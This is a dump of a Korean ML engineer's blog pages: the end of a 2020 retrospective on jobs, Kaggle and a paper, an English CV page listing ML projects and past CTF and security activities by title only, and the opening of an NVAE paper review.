적도 있었어요. 페이스 조절 없이 쏟아부으려만 했던 게 문제였다는걸 깨닫고 조절하려 나름 노력했지만, 쉰다는 느낌이 들면 시간 낭비 같고 뭐라도 해야 한다는 생각, 아니 어쩌면 강박에 제대로 여유를 가져본 적이 없던 거 같아요. 이젠 이 방식이 내가 쉬는 방식이 아닐까 생각하는데, 내년에는 꼭 대안을 찾아보자.\n\n결론은 행복하고 성장할 수 있는 좋은 시간이라 생각한다. 좋아하는 수많은 딥러닝 논문들을 읽고, 문제를 풀기 위해 끊임없이 고민하며 모델과 기술을 개발하면서 기술적으로 완성해 갈 수 있는 시간이었지만, 너무 기술 하나에만 몰두하고 있었단 생각도 들어 시야를 조금 더 넓게 보려는 노력이 필요하다 생각이 든다. 또 하나 아쉬웠던 점은 커뮤니케이션, 잘하기엔 개인적인 노력도 많이 부족했는데 이 부분도 점점 개선해 잘하는 사람이 되고 싶다.\n\n그리운 게 있다면, 회사 뒤편에 조그마한 카페가 하나 있는데, 거기에 파는 **쿠키엔크림** 쉐이크가 그렇게나 맛있어서 기분 전환하거나 생각할 게 많을 때면 자주 가곤 했는데, 그 맛이 그리워지네요.\n\n### 두 번째 회사\n\n병특을 위해 다른 회사로 이직했어요. 이직한 회사는 여의도에 있는 어느 핀테크 스타트업에 *머신러닝 엔지니어*로 들어가게 됐는데, 이 회사가 여러 의미로 제가 많이 바뀔 수 있는 계기가 됐어요.\n\n전에 다녔던 회사에 비해 일정과 업무 모든 게 체계적이고 힙한 기술 문화를 가지고 있었다. 평소의 자유분방하고 도전적인 제 성격과 성향에 반대되는 회사라 처음엔 적응하기 많이 힘들었지만, 내 단점들을 고칠 좋은 기회라 생각해, 회사에서 주는 피드백을 최대한 고치려고 노력했던 거 같아요.\n\n업무로는 평소에 관심 없던 딥러닝 모델 서빙용 서버 개발, 서비스 로직 백엔드 개발이 업무였는데, 이때 k8s 도 제대로 사용해 보고, 서버 장애 로깅을 위한 dashboard 작업, latency 최적화를 위해 모델 경량화와 server-side 쪽에 노력을 쏟고, A/B 테스트에서 좋은 성과, 짧지만 정말 남는 게 많은 시간이었어요. 처음에는 내가 원하고 생각한 업무랑 다른데? 생각도 했지만, 지금 생각해 보니 첫 회사에서 고민하던 `좁은 시야`를 해소할 수 있었던 시간이라 생각이 들어요.\n\n하나 그리운 게 있다면, **여의도 커피**란 카페에서 리모트 근무를 자주 했는데, 원하는 원두로 드립커피 먹는 맛이 있었는데, 이건 조금 그립네요.\n\n### 세 번째 회사\n\n이직을 한 번 더 했어요. 또 병특이 이유인데, 회사가 오해를 받아 병특 지정 업체에서 제외돼서 병특을 할 수 없게 됐어요. 그래서, 올해 6월에 다른 곳으로 이직하게 됐어요. 이직한 곳은 영화나 드라마 같은 컨텐츠를 서비스해 주는 강남에 있는 한 회사에요. 현재는 여기에서 현역 병특 TO를 받아서 올해 11월부터 복무 시작했어요.\n\n영화를 정말 좋아하며 서비스 초창기부터 사용했고 고등학생 때부터 한 번쯤 일하고 싶다고 생각한 회산데, 직무도 *머신러닝 연구원*으로 병특도 하게 되면서 덕업일치 했다고 생각해요. 연구팀 업무수행 방식은 자유롭게 자신이 하고 싶은 업무를 오너쉽을 가지고 하는 방식이라, 직접 딥러닝 모델을 만들어 유저들에게 좋은 경험을 선사할 수 있다는 점에서 개인적인 목표하고도 일치해서 만족하고 있어요.\n\n하나 남겨진 숙제라면, 업무의 경계가 크게 없고 이것저것 많이 해 볼 수 있다는 점에선 꽤 즐거운 일이지만, 결국 여기서도 혼자 달리고 있다는 걸 느껴 언제까지 외로움을 이겨낼 수 있을까에 대한 걱정과 현업에서 한 팀으로 열심히 공부하고 문제를 풀고 있는 다른 분들과의 격차가 점점 벌어지는 것에 대한 두려움이 있어요. 이런 숙제도 해결하는 걸 내 능력이라 생각하고 21년에는 멋지게 해결하게 화이팅 해 보자!\n\n## Kaggle\n\n한동안 딥러닝 모델을 만들고 연구하는 업무를 못 할 때, 공부를 쉬었단 불안감에 대회도 나가보자 해서 올해부터 Kaggle을 해 보기 시작했어요. 현재는 *Kaggle Competition Expert*로 은메달 3개, 동메달 1개를 얻어서 금메달 1개만 따면 *Competition Master*로 올라갈 수 있는데 *GrandMaster* 가 되는 날까지 더 화이팅 하자!\n\n성과도 중요하지만, 말하고 싶었던 건 대회를 열심히 시작했다는 점이 아닌, 팀플레이에요. 올해 Cornell Bird Identification Challenge를 하다 만난 분들이 있는데, 이렇게 한 팀으로 협업해 본 경험도 처음이고 서로의 능력이 시너지가 돼 대회에서도 좋은 결과가 있어서 저에겐 정말 뜻깊은 경험이었어요. 대회 끝나고도 대회 연관해서 음성처리 관련 글을 써 보면 어떨까 제안해 주셔서 2달 동안 주말에 만나서 조금씩 글을 썼는데, 최근에 [**towardsdatascience**](https://towardsdatascience.com/detecting-sounds-with-deep-learning-ed9a41909da0) 에 publish 했고 반응도 좋고 보람찬 경험이었어요. (~~좋아요와 팔로우 부탁드려요~~)\n\n사실 제 분야에 있어서 같은 목표를 가지고 팀으로 협업한 경험이 별로 없어서 그런지 정말 저에게 환기되고 짜릿한(?) 무언가를 다시 느껴볼 수 있어 방전된 배터리를 *100%*로 고속 충전하는 느낌이었어요. 앞으로 계속 이런 활동을 하려고 노력하려고요!\n\n## 논문\n\n18년 초에 네이버 A.I 해커톤에서 개발한 모델은 기반으로 논문을 한 편 썼어요. 학교에서 학부 연구생 할 때 썼는데, 연구 쪽 경험도 하고 싶고 논문 쓰는 법도 지도받고 싶어서 교수님들께 부탁해서 작업하게 됐어요. 교수님들께 배운 점들이 많았고 제 고집 때문에 많이 힘드셨을 텐데 죄송하면서 그래도 끝까지 지도해주신 교수님들께 정말 감사드려요.\n\n논문 주제를 한 줄로 정리하면, `정제되지 않은 한국어 문장을 잘 학습할 수 있는 CNN 모델 구조 w/ Attention`를 제안했고. 교수님 추천으로 [KTCCS](http://ktccs.kips.or.kr/) 국내 학회에 [publish](http://ktccs.kips.or.kr/digital-library/full-text/view?doi=10.3745/KTCCS.2020.9.1.17) 했고, 지금 학회 사이트에 들어가 보니 *Highlights* 리스트 첫 번째에 보여서 기분이 좋네요.\n\n앞으로도 꾸준히 연구 쪽으로도 작업을 계속해 나갈 거고, 최근에 Super Resolution 쪽 생각한 아이디어도 있어 운 좋으면 내년 안에 실험 완료하고 작성도 시작해서 CVPR, ECCV 같은 학회를 목표로 해보자!\n\n## 군대\n\n제 병특때문에 많은 분들이 걱정해 주시고 적극적으로 도와주셨는데, 한 분씩 모두 감사하다 인사드렸지만, 다시 감사하다 말씀드리고 싶어요. 위에 지나쳤던 3곳의 회사 말고도 정말 다양한 분야의 회사와 면접만 세어보면 10번 이상 진행했는데, 그 썰을 풀기엔 블로그 여백이 부족해서 한 단어로 정리하자면 파란만장이라 할 수 있을 거 같다. 그동안 스트레스도 많이 받았지만, 결국엔 잘 풀렸으니 정말 다행이에요.\n\n## 운동\n\n올해는 운동을 위한 해였다. 평소에 코딩하면서 자주 피로함을 느꼈는데, 기본 체력이 부족한 거 같아 집에서 맨몸운동을 시작했다. 그런데 성격상 동기부여 제대로 된 건 시작하면 끝을 보는 성격이라, *플란체*를 목표로 매일 꾸준히 운동하고 있다. 덕분에 굽었던 뼈가 펴졌는지 모르겠지만, 키도 커지고 수족냉증도 사라지고 몸이 건강해 진 게 느낄 정도라 너무 만족하고 있다.\n\n## 정리\n\n이렇게 회고를 쓰며 생각들을 정리해 보며 돌아보면서 부족한 점과 앞으로 할 것들이 정리되니 조금은 홀가분해진 기분이네요. 꼭 연말이 아녀도 자주 이런 시간을 가져야겠어요. 마침 모델 훈련한 게 거의 끝나서 모델 확인하는 즐거운 시간 보내러 가야겠어요.\n\n올 한해 특히 코로나 때문에 많은 분 힘드실 텐데, 이 글을 보신 분, 안 보신 분 모두 따뜻한 연말 보내고 내년에도 화이팅해요!\n","excerpt":"TL;DR 올해 처음으로 회고록을 적어보는데, 사실 작년부터 써야지 생각만 하다 결국 놓쳤는데, 벌써 1년이 지나 쓸 때가 온 걸 보고 시간은 정말 빨리 가는 걸 실감하며, 2020년 회고지만 지난 2년 동안 일어났던 작고 큼지막한 일들을 하나씩 적…","fields":{"slug":"/Review2020/"},"frontmatter":{"date":"Dec 23, 2020","title":"2020년 회고","tags":["Diary"],"update":"Dec 27, 2020"},"timeToRead":5}},{"node":{"rawMarkdownBody":"\n## Profile\n\nAlternative Military Service Status : **on duty** (`2020/11/27 ~ 2023/09/26`)\n\nCV : [[PDF] (as of Jul. 2022)](http://kozistr.tech/cv.pdf)\n\n## Links\n\n|          |                                                                            |\n| :------- | :------------------------------------------------------------------------- |\n| Email    | **kozistr**@gmail.com                                                      |\n| Github   | [https://github.com/kozistr](https://github.com/kozistr)                   |\n| Kaggle   | [https://www.kaggle.com/kozistr](https://www.kaggle.com/kozistr)           |\n| Linkedin | [https://www.linkedin.com/in/kozistr](https://www.linkedin.com/in/kozistr) |\n\n## Interests\n\n- Lots of real-world challenges like **Kaggle**\n- Audio/Speech Domains\n  - End to End Speaker Diarization\n  - Speaker Verifications\n- Computer Vision Domains\n  - especially the medical domain\n\nPreviously, I was also interested in **offensive security**, kind of _Reverse Engineering_, _Linux Kernel Exploitation_.\n\n---\n\n## Challenges & Awards\n\n### Machine Learning\n\n- **Kaggle Challenges** :: Kaggle Challenges :: **Competition Expert**\n\n  > - [Google Brain - Ventilator Pressure Prediction](https://www.kaggle.com/c/ventilator-pressure-prediction) - **team, top 1% (20 / 2605), Private 0.1171** - [solution](https://www.kaggle.com/c/ventilator-pressure-prediction/discussion/285295#1570360) (2021.)\n  > - [SIIM-FISABIO-RSNA COVID-19 Detection](https://www.kaggle.com/c/siim-covid19-detection) - **solo, top 4% (47 / 1305), Private 0.612** - [solution](https://www.kaggle.com/c/siim-covid19-detection/discussion/263830#1463830) (2021.)\n  > - [Shopee - Price Match Guarantee](https://www.kaggle.com/c/shopee-product-matching) - **solo, top 7% (166 / 2426), Private 0.725** (2021.)\n  > - [Cornell Birdcall Identification](https://www.kaggle.com/c/birdsong-recognition) - **team, top 2% (24 / 1395), Private 0.631** - [towarddatascience](https://towardsdatascience.com/detecting-sounds-with-deep-learning-ed9a41909da0) (2020.)\n  > - [ALASKA2 Image Steganalysis](https://www.kaggle.com/c/alaska2-image-steganalysis) - **solo, top 9% (93 / 1095), Private 0.917** (2020.)\n  > - [Tweet Sentiment Extraction](https://www.kaggle.com/c/tweet-sentiment-extraction) - **solo, top 4% (84 / 2227), Private 0.71796** (2020.)\n  > - [Flower Classification with TPUs](https://www.kaggle.com/c/flower-classification-with-tpus) - **solo, top 4% (27 / 848), Private 0.98734** (2020.)\n  > - [Kaggle Bengali.AI Handwritten Grapheme Classification](https://www.kaggle.com/c/bengaliai-cv19) - **solo, top 4% (67 / 2059), Private 0.9372** (2020.)\n  > - [Kaggle Kannada MNIST Challenge](https://www.kaggle.com/c/Kannada-MNIST) - **solo, top 3% (28 / 1214), Private 0.99100** (2019.)\n\n- **NAVER NLP Challenge** :: NAVER NLP Challenge 2018\n\n  > - [Final](https://github.com/naver/nlp-challenge) - _Semantic Role Labeling (SRL)_ **6th place** - [oral presentation](https://bit.ly/3eneg2y)\n\n- **A.I R&D Challenge** :: A.I R&D Challenge 2018\n\n  > - [Final](http://airndchallenge.com/g5) - _Fake or Real Detection_ - as _Digital Forensic_ Team\n\n- **NAVER A.I Hackathon** :: NAVER A.I Hackathon 2018\n\n  > - [Final](https://github.com/naver/ai-hackathon-2018) - _Kin_ **4th place**, _Movie Review_ **13th place** - [solution](https://github.com/kozistr/naver-ai-hackathon-2018)\n\n- **TF-KR Challenge** :: Facebook TF-KR MNIST Challenge\n\n  > - [TF-KR MNIST Challenge](https://github.com/kozistr/MNIST-Competition) - **Top 9, 3rd price, ACC 0.9964**\n\n### Hacking\n\n- **Boot2Root CTF 2018** :: **2nd place** (Demon + alpha)\n\n- **Harekaze CTF 2017** :: **3rd place** (SeoulWesterns)\n\n- **WhiteHat League 1 (2017)** :: **2nd place** (Demon)\n\n  > - Awarded by 한국정보기술연구원 Received an award of **$3,000**\n\n---\n\n## Work Experience\n\n### Company\n\n#### _Data Scientist_, **Toss core**, **(2021.12.06 ~ present)**\n\n- Working as full-time.\n- Developed the multi-label text classification model to categorize users' reviews (NPS).\n  - Boost to analyze the feedback with rich information automatically.\n  - Build the RESTful API server to infer the model for the batch job.\n  - Save analysis time and labor a lot.\n- Developed the robust captcha model to predict captchas.\n  - light-weighted CNN model for real-time inference (about `~ 1000 TPS` for a batch transaction, `80 ~ 100 TPS` for a sample on the CPU)\n  - Build augmentations which fit in the domain to build a robust model.\n  - Build the RESTful API server to serve the model in real-time on the CPU.\n  - In A/B (online) test, `google vision OCR` vs `New Captcha Model`\n    - **Accuracy** : improved **50%p** (`45%` to `95%`)\n    - **latency (p95)** : reduced by **80x** (about `1000ms` to `12ms`)\n    - **Revenue** : Save about **$7,000 / year**\n- Developed the model to forecast the transactions' category to purchase next month.\n  - Transformer-based architecture with the transactions & user demographic.\n  - Build an efficient pipeline to train the large tabular data (500GB ~).\n  - In A/B (online) test, `previous ML model` vs `AdsClassifier` (statistically significant `p-value < 0.05`)\n    - **Conversion** : soon!\n    - **CTR** : soon!\n- Developed the CSS model for BNPL (CSS model)\n  - EDA to find the useful features correlated with the overdue user.\n  - Build the robustness CV & ensemble strategy in an aspect of the on/offline performance.\n  - Achieved targeted default rate, 1%.\n- Developed the card category classification model.\n  - Transformer-based architecture, about `900 TPS` on a single GPU.\n  - Handle noisy-text (transaction) & label, class-imbalanced problem.\n  - Help to boost the accuracy of the ads category, which increases the revenue in a roundabout way.\n- Contributed to the team culture (e.g. collaboration tools, style guides, etc).\n\n#### _Machine Learning Researcher_, **Watcha**, **(2020.06.22 ~ 2021.12.03)**\n\n- Worked as full-time.\n- Developed a new sequential recommendation architecture. (named `Trans4Rec`)\n  - Newly proposed transformer architecture to improve the performance in a genernal manner.\n  - Apply proper post-processing logic into the model.\n  - In A/B (online) test, `FutureFLAT` vs `Trans4Rec` (statistically significant `p-value < 0.01`)\n    - **Click Ratio** : improved **1.01%**\n- Developed a music recommendation system (prototype)\n- Developed a training recipe to train sequential recommendation architecture. (named `FutureFLAT`)\n  - Build _Future_ module to understand better at the time of inference.\n  - Applying augmentations to the various features, leads to performance gain & robustness.\n  - **In A/B (online)** test, `FLAT` vs `FutureFLAT` (statistically significant `p-value < 0.05`)\n    - Compared to the previous model (`FLAT`), there’s no (statistically significant) improvments.\n    - However, it still seems to be better on `the offline metrics` & `training stability`. So, we chose to use it.\n  - **In A/B (online)** test, [`Div2Vec`](https://arxiv.org/abs/2009.09588) vs `FutureFLAT` (statistically significant `p-value < 0.05`)\n    - **\\*Viewing Days (mean)** : improved **1.012%**\n    - **\\*Viewing Minutes (median)** : improved **1.015%**\n- Developed a model to predict expected users' view-time of the contents.\n  - Predict how many and how much time people are going to watch the content before the content supplied.\n  - Find out which features impact users' watches.\n- Developed a pipeline to recognize the main actors from the poster and still-cut images.\n  - Utilize **SOTA** face detector & recognizer.\n  - Optimize pre/post processing routines for low `latency`.\n- Developed a novel sequential recommendation architecture to recommend what content to watch next. (named `FLAT`)\n  - **In A/B (online)** test, `previous algorithms` vs `FLAT` (statistically significant `p-value < 0.05`)\n    - **Paid Conversion** : improved **1.39%p+**\n    - **\\*Viewing Days (mean)** : improved **0.25%p+**\n    - **\\*Viewing Minutes (median)** : improved **4.10%p+**\n    - **Click Ratio** : improved **4.30%p+**\n    - **Play Ratio** : improved **2.32%p+**\n- Developed Image Super-Resolution model to upscale movie & tv poster, still-cut images.\n  - Optimize the codes for `low latency` & `memory efficiency` on the _CPU_.\n  - An internal evaluation (qualitative evaluation by the designers), catches details better & handles higher resolution & takes a little time.\n\n% `*Viewing Days` : how many days are users active on an app each month.\n\n% `*Viewing Minutes` : how many minutes the user watched the contents.\n\n#### _Machine Learning Engineer_, **Rainist**, **(2019.11.11 ~ 2020.06.19)**\n\n- Worked as full-time.\n- Developed the card & bank account transaction category classification models, and designed _light-weight purpose_ for the low latency. (In-service)\n  - **In A/B (online)** test (statistically significant `p-value < 0.05`)\n    - **\\*Accuracy** : improved **about 25 ~ 30%p**\n- Developed the RESTful API server to serve (general purpose) machine learning models.\n  - about 1M MAU service, 500K ~ 1M transactions / day (1 transaction = (median) about 100 samples).\n  - Utilized `inference-aware framework` (onnx) to reduce the latency.\n    - median 100 ~ 200ms / transaction.\n  - zero failure rate (**0** 40x, 50x errors)\n  - Deployed & managed with Kubernetes, utilized open source project.\n- Developed the classification model for forecasting the possibility of loan overdue.\n\n% `*Accuracy` : how many people don't update/change their transactions' category.\n\n#### _Machine Learning Engineer_, **VoyagerX**, **(2019.01.07 ~ 2019.10.04)**\n\n- Worked as an intern.\n- Developed speaker verification, diarization models & logic for recognizing the arbitrary speakers recorded from noisy (real-world) environment.\n- Developed a hair image semantic segmentation / image in-paint / i2i domain transfer model for swapping hair domains naturally.\n\n#### _Penetration Tester_, **ELCID**, **(2016.07 ~ 2016.08)**\n\n- Worked as a part-time job.\n- Penetrated some products related to network firewall and anti-virus products.\n\n### Out Sourcing\n\n- Developed Korean University Course Information Web Parser (About 40 Universities). **2 times, (2017.7 ~ 2018.3)**\n- Developed AWS CloudTrail logger analyzer / formatter. **(2019.09 ~ 2019.10)**\n\n### Lab\n\n[HPC Lab](https://sites.google.com/view/hpclab/home), KoreaTech, **Undergraduate Researcher**, **(2018.09 ~ 2018.12)**\n\n- Wrote a paper about an improved TextCNN model to predict a movie rate.\n\n---\n\n## Publications\n\n### Paper\n\n[1] **Kim** et al, [CNN Architecture Predicting Movie Rating](http://ktccs.kips.or.kr/digital-library/23245), 2020. 01.\n\n- Wrote about the CNN Architecture, which utilizes a channel-attention method (SE Module) to TextCNN model, brings performance gain over the task while keeping its latency, generally.\n- Handling un-normalized text with various convolution kernel sizes and spatial dropout\n- Selected as one of the `highlight papers` for the first half of 2020\n\n### Conferences/Workshops\n\n[1] `kozistr_team`, [presentation](https://bit.ly/3eneg2y) _NAVER NLP Challenge 2018 SRL Task_</a>\n\n- SRL Task, challenging w/o any domain knowledge. Presented about trials & errors during the competition\n\n### Journals\n\n[1] zer0day, [_Windows Anti-Debugging Techniques_](http://zer0day.tistory.com/335?category=505873) (CodeEngn 2016) Sep. 2016. [PDF](/refs/Anti%20Revering%20Techniques%20%5Bzer0day%5D.pdf)\n\n- Wrote about lots of anti-reversing / debugging (A to Z) techniques avail on window executable binary\n\n### Posts\n\n[1] kozistr (as a part of team, `Dragonsong`) [towarddatascience](https://towardsdatascience.com/detecting-sounds-with-deep-learning-ed9a41909da0)\n\n- Wrote about audio classifier with deep learning based on the Kaggle challenge where we participated\n\n---\n\n## Personal Projects\n\n### Machine/Deep Learning\n\n#### Generative Models\n\n- **GANs-tensorflow** :: Lots of GAN codes :) :: [Generative Adversary Networks](https://github.com/kozistr/Awesome-GANs)\n\n  > - **ACGAN-tensorflow** :: Auxiliary Classifier GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/ACGAN)\n  > - **StarGAN-tensorflow** :: Unified GAN for multi-domain :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/StarGAN)\n  > - **LAPGAN-tensorflow** :: Laplacian Pyramid GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/LAPGAN)\n  > - **BEGAN-tensorflow** :: Boundary Equilibrium in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/BEGAN)\n  > - **DCGAN-tensorflow** :: Deep Convolutional GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/DCGAN)\n  > - **SRGAN-tensorflow** :: Super-Resolution GAN in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/SRGAN)\n  > - **WGAN-GP-tensorflow** :: Wasserstein GAN w/ gradient penalty in tensorflow :: [code](https://github.com/kozistr/Awesome-GANs/tree/master/WGAN)\n  > - ... lots of GANs (over 20) :)\n\n#### Super Resolution\n\n- **Single Image Super Resolution** :: Single Image Super-Resolution (SISR)\n\n  > - **rcan-tensorflow** :: RCAN implementation in tensorflow :: [code](https://github.com/kozistr/rcan-tensorflow)\n  > - **ESRGAN-tensorflow** :: ESRGAN implementation in tensorflow :: [code](https://github.com/kozistr/ESRGAN-tensorflow)\n  > - **NatSR-pytorch** :: NatSR implementation in pytorch :: [code](https://github.com/kozistr/NatSR-pytorch)\n\n#### I2I Translation\n\n- **Improved Content Disentanglement** :: tuned version of 'Content Disentanglement' in pytorch :: [code](https://github.com/kozistr/improved-ContentDisentanglement)\n\n#### Style Transfer\n\n- **Image-Style-Transfer** :: Image Neural Style Transfer\n\n  > - **style-transfer-tensorflow** :: Image Style-Transfer in tensorflow :: [code](https://github.com/kozistr/style-transfer)\n\n#### Text Classification/Generation\n\n> - **movie-rate-prediction** :: Korean sentences classification in tensorflow :: [code](https://github.com/kozistr/naver-movie-rate-prediction)\n> - **KoSpacing-tensorflow** :: Automatic Korean sentences spacing in tensorflow :: [~~code~~](https://github.com/kozistr/KoSpacing-tensorflow)\n> - **text-tagging** :: Automatic Korean articles categories classification in tensorflow :: [code](https://github.com/sales-tagging/text-tagging-ml)\n\n#### Speech Synthesis\n\n- **Tacotron-tensorflow** :: Text To Sound (TTS)\n\n  > - **tacotron-tensorflow** :: lots of TTS models in tensorflow :: [~~code~~](https://github.com/kozistr/tacotron-tensorflow)\n\n#### Optimizer\n\n- **pytorch-optimizer** :: Bunch of optimizer implementations in PyTorch\n\n  > - **pytorch_optimizer** :: Bunch of optimizer implementations in PyTorch with clean-code, strict types. Also, including useful optimization ideas. Most of the implementations are based on the original paper, but I added some tweaks. :: [code](https://github.com/kozistr/pytorch_optimizer)\n\n- **AdaBound** :: Optimizer that trains as fast as Adam and as good as SGD\n\n  > - **AdaBound-tensorflow** :: AdaBound Optimizer implementation in tensorflow :: [code](https://github.com/kozistr/AdaBound-tensorflow)\n\n- **RAdam** :: On The Variance Of The Adaptive Learning Rate And Beyond in tensorflow\n\n  > - **RAdam-tensorflow** :: RAdam Optimizer implementation in tensorflow :: [code](https://github.com/kozistr/RAdam-tensorflow)\n\n#### R.L\n\n- **Rosseta Stone** :: Hearthstone simulator using C++ with some reinforcement learning :: [code](https://github.com/utilForever/RosettaStone)\n\n### Open Source Contributions\n\n- [syzkaller](https://github.com/google/syzkaller) :: New Generation of Linux Kernel Fuzzer :: [#575](https://github.com/google/syzkaller/pull/575)\n- [simpletransformers](https://github.com/https://github.com/ThilinaRajapakse/simpletransformers) :: Transformers made simple w/ training, evaluating, and prediction possible w/ one line each. :: [#290](https://github.com/ThilinaRajapakse/simpletransformers/pull/290)\n- [pytorch-image-models](https://github.com/rwightman/pytorch-image-models) :: PyTorch image models, scripts, pretrained weights :: [#1058](https://github.com/rwightman/pytorch-image-models/pull/1058), [#1069](https://github.com/rwightman/pytorch-image-models/pull/1069)\n- [deit](https://github.com/facebookresearch/deit) :: DeiT: Data-efficient Image Transformers :: [#140](https://github.com/facebookresearch/deit/pull/140), [#147](https://github.com/facebookresearch/deit/pull/147), [#148](https://github.com/facebookresearch/deit/pull/148)\n- [MADGRAD](https://github.com/facebookresearch/madgrad) :: MADGRAD Optimization Method :: [#11](https://github.com/facebookresearch/madgrad/pull/11)\n- [tensorflow-image-models](https://github.com/martinsbruveris/tensorflow-image-models) :: TensorFlow Image Models (tfimm) is a collection of image models with pretrained weights, obtained by porting architectures from timm to TensorFlow :: [#61](https://github.com/martinsbruveris/tensorflow-image-models/pull/61)\n\n### Plug-Ins\n\nIDA-pro plug-in - Golang ELF binary (x86, x86-64), RTTI parser\n\n- Recover stripped symbols & information and patch byte-codes for being able to hex-ray\n\n## Security, Hacking\n\n### CTFs, Conferences\n\n- [POC](http://powerofcommunity.net/) 2016 Conference Staff\n- [HackingCamp](http://hackingcamp.org/) 15 CTF Staff, Challenge Maker\n- [CodeGate](https://www.codegate.org/) 2017 OpenCTF Staff, Challenge Maker\n- [HackingCamp](http://hackingcamp.org/) 16 CTF Staff, Challenge Maker\n- [POX](http://www.powerofxx.com/) 2017 CTF Staff, Challenge Maker\n- [KID](http://www.powerofxx.com/) 2017 CTF Staff, Challenge Maker\n- Belluminar 2017 CTF Staff\n- [HackingCamp](http://hackingcamp.org/) 17 CTF Staff, Challenge Maker\n- [HackingCamp](http://hackingcamp.org/) 18 CTF Staff, Challenge Maker\n\n### Teams\n\nHacking Team, [**Fl4y**](http://f1ay.com/). **Since 2017.07 ~**\n\nHacking Team, [**Demon**](https://demonteam.org/) by [_POC_](http://powerofcommunity.net/). **Since 2014.02 ~ 2018.08**\n\n---\n\n## Educations\n\n**Senior** in Computer Engineering from [KUT](https://www.koreatech.ac.kr/eng.do)\n\n## Presentations\n\n### 2018\n\n[2] Artificial Intelligence ZeroToAll, Apr 2018.\n\n[1] Machine Learning ZeroToAll, Mar 2018.\n\n### 2015\n\n[1] Polymorphic Virus VS AV Detection, Oct 2015.\n\n### 2014\n\n[1] Network Sniffing & Detection, Oct, 2014.\n","excerpt":"Profile Alternative Military Service Status : on duty () CV : [PDF] (as of Jul. 2022) Links   Email kozistr@gmail.com Github https://github…","fields":{"slug":"/about/"},"frontmatter":{"date":"Dec 12, 2020","title":"About ME","tags":["About"],"update":"Aug 07, 2022"},"timeToRead":16}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근에 NVLabs 에서 VAE 관련 논문이 하나 나왔는데, 매주 월요일이 회사 짬데이라고 개인 or 팀 끼리 공부하고 싶은 주제 공부하고 공유하는 문화가 있어서, 마침 잘 돼서 논문 리뷰를 해 봅니다.\n\npaper : [arXiv](https://arxiv.org/pdf/2007.03898.pdf)\n\ncode : [github](https://github.com/NVlabs/NVAE)\n\n## Related Work\n\nVAE 관련 연구들이 엄청 많아서, 요 논문과 직접 연관이 있는 것들만 적어보면\n\n1. IAF-VAEs (VAE w/ Invertible Autoregressive Flows) : [paper](https://arxiv.org/pdf/1606.04934.pdf)\n2. VQ-VAE-2 (Vector Quantized Variational AutoEncoder v2) : [paper](https://arxiv.org/pdf/1906.00446.pdf)\n3. BIVA (Bidirectional-Inference Variational AutoEncoder) : [paper](https://arxiv.org/pdf/1902.02102.pdf)\n\n## Difference\n\n논문에서 previous works 와 this work 의 차이를 *related work* 에 적힌 3 개의 연구와 비교를 합니다.\n\n요약하면 아래와 같습니다.\n\n### VQ-VAE-2 vs NVAE\n\n비슷한 점은 둘 다 high quality image 생성이 가능하다는 점\n\n| diff \\ work | VQ-VAE-2 | NVAE |\n| :---: | :---: | :---: |\n| objective | ~~VAE objective~~ | VAE objective |\n| latent variable | up to 128x128 (big) | small |\n\n### IAF-VAEs vs NVAE\n\nstatistical models (hierarchical prior, approximate posterior) 컨셉을 IAF-VAEs 에서 가져온 것은 맞는데,\n\n| diff \\ work | IAF-VAEs | NVAE |\n| :---: | :---: | :---: |\n| statistical models | ~~neural network~~ | neural network |\n| posterior | x | parameterized |\n| large-scale | x | o |\n\n### BN (Batch Normalization) in VAE?\n\n이전 연구들에선 BN 이 instability 를 cause 해서 사용을 지양했는데,\n이번 엔구에선 BN parameter 를 적절하게 사용하면 오히려 좋은 성능이 나온다 라고 하더군요.\n\n## Novelty\n\n위와 같은 차이점들에 대해서 이번 연구는 요약해서 크게 3 가지 novelties 를 가집니다.\n\n### Network Design\n\n이전 Hierarchical VAE 연구들은 hierarchical 한 요소들을 objective term 이나 level 에서 고려헀지만,\n\n이번 연구에서는 statistical models 을 **network design 자체에 녹여냈다**.\n\n### Stability\n\nhierarchical groups 수가 증가, input image size (high resolution) 가 커 지면서 stabilization 이 issue 가 되는데,\n이를 직접 디자인한 **(1) network modules**, **(2) approximate posterior 를 parameterize** 함으로 문제 해결.\n\n### Efficiency\n\n효율적은 operation 사용 (e.g. depth-wise separable convolution at decoder) 으로 memory 를 아끼고 성능도 잡아냈다.\n\n% 저자 왈 depth-wise separable conv 를 decoder 에 사용했을 땐 성능이 좋았는데, encoder 에 사용했을 땐 성능이 오히려 안좋았다고 캅니다.\n\n## Introduce\n\n간단하게 deep hierarchical VAE 를 review 하고 넘어가면,\n\n*approximate posterior* 와 *prior* 를 증가시키기 위해, *latent variables* 를 총 *$L$* 개의 disjoint groups 으로 나눕니다.\n\n> $z = {z_1, z_2, ..., z_L}$\n\n그리고 *prior* 와 *approximate posterior* 는 이렇게 써 볼 수 있을텐데, (물론 두 distributions 은 Normal 을 따른다 가정한다)\n\n> $p(z) = \\prod_{l} p(z_l\\|z_{<l})$\n\n> $q(z\\|x) = \\prod_{l} q(z_l\\|z_{<l}, x)$\n\n그럼 $log p(x)$ 에 대한 lower bound $L_{VAE} (x)$ 는 아래와 같이 쓸 수 있겠죠...?\n\n> $L_{VAE} (x) = \\mathop{\\mathbb{E}}_{q(z\\|x)} - KL(q(z_{1}\\|x) \\|\\| p (z_{1})) - \\sum_{l=2}^{L} \\mathbb{E}_{q (z_{l}\\|x)} KL (q (z_{l}\\|x, z_{<l}) \\|\\| p(z_{l}\\|z_{<l}))$\n\n한번 더 적어보면, 아래가 이제 $(l - 1)^{th}$ group 까지의 *approximate posterior* 가 되는 겁니다.\n\n> $q(z_{<l}\\|x) = \\prod_{i=1}^{l-1} q(z_{i}\\|x, z_{<i})$\n\n그럼 여기서 $p(x, z)$, $p(z\\|x)$ 를 어떻게 neural network 로 구현할 지가 이번 연구에서 포인트 입니다.\n\n## Architecture\n\n아래 이미지와 같이 Bidirectional Encoder ($p(z\\|x)$) 와 Generative Model ($p(x, z)$)이 있는데,\n\nlevel 에 맞게 각 group 에서 sample 해 와서 add 하는 연산을 합니다.\n\n또한 computation cost 를 줄이기 위해 Bidirectional Encoder 에 있는 top-down model 부분은 Generative Model 하고 weight-share 